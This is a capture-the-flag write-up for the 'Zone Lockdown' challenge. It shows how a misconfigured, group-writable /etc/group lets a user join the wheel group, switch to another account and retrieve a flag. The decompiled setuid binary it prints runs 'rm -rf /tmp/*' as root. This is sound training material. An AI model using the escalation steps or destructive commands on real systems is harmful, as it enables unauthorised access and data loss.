# [HE2024] Zone Lockdown

We have SSH access to some kind of linux server.

```console
minion$ uname -a
Linux f98d4ed1472a 5.15.0-100-generic #110-Ubuntu SMP Wed Feb 7 13:27:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

We know there are two users: `minion` and `boss`. We know the password for both, but we can only login using `minion`.

We need to execute `/home/boss/lockdown.sh`, but `/home/boss` has `700` permissions, so we need to become the `boss`.

```console
minion$ ls -ld /home/boss
drwx------ 1 boss 1001 4096 Apr 30 22:16 /home/boss
```

However, we cannot login as `boss` through SSH, and `su` isn't working either, even using the correct password.

```console
$ ssh boss@...
boss@...'s password:
Permission denied, please try again.
```

```console
minion$ su boss
Password:
su: Permission denied
```

Time to investigate the server. Is there anything useful anywhere?

```console
minion$ ls -lR /opt/
-rwsr-xr-x 1 root 1001 24328 Mar 12 16:45 reset
```

Yes! After investigating all folders in `/`, we notice a weird executable called `reset` in `/opt/`. It has the `setuid` bit set, meaning it'll execute will root access, since the file belongs to `root`.

Executing this program kills the SSH session, weird:

```console
minion$ /opt/reset
Connection to ... closed by remote host.
```

Let's download the reset executable to analyze this locally. Sadly, `scp` isn't installed, so we're going to `cat` the file and redirect the output.

```bash
ssh minion@... "cat /opt/reset" > reset
```

Decompiling the main function using Ghidra, we get:

```c
main(void)
{
  setuid(0);
  system("cp /etc/group.bak /etc/group");
  system("rm -rf /tmp/*");
  system("killall -u minion");
  return 0;
}
```

Why does this execute resets the `/etc/group` file?

That's how I noticed that `/etc/group` was writable by the `root` group, and our `minion` user belongs to the `root` group.

`/etc/group.bak` is **not** writable, and probably used to restore a clean version of this file after we pwned the server.

```console
minion$ ls -l /etc/group
-rw-rw-r-- 1 root root 473 Apr 30 22:35 /etc/group
minion$ ls -l /etc/group.bak
-rwxr--r-- 1 root root 473 Mar 12 16:45 /etc/group.bak
minion$ groups
minion root
```

Now that we know we can edit the groups, we can do quite a few things, including adding our `minion` user to the `wheel` group. The `wheel` group often allows users to switch to another user, using `su`.

```diff
< wheel:x:10:
> wheel:x:10:minion
```

Now that we're in `wheel`, we can relog to apply changes and switch to `boss`.

```console
minion$ groups
minion root wheel
minion$ su boss
Password:
boss$ cat /home/boss/lockdown.sh
```

```bash
echo "ZONE LOCKDOWN initiated!"
echo ""
echo "RmxhZzogIGhlMjAyNHt6MG5lX2wwY2tkMHduX3N1Y2Mzc3NmdWxseV90cjFnZzNyM2R9" | base64 -d
echo "\n"
echo "ZONE LOCKDOWN completed, good bye."
/opt/reset
echo ""
exit
```

As expected, `/opt/reset` is used to restore the groups after a successful pwn.

Let's execute the lockdown to get the flag.

```console
boss$ ./lockdown.sh
ZONE LOCKDOWN initiated!

Flag:  he2024{z0ne_l0ckd0wn_succ3ssfully_tr1gg3r3d}\n
ZONE LOCKDOWN completed, good bye.
```

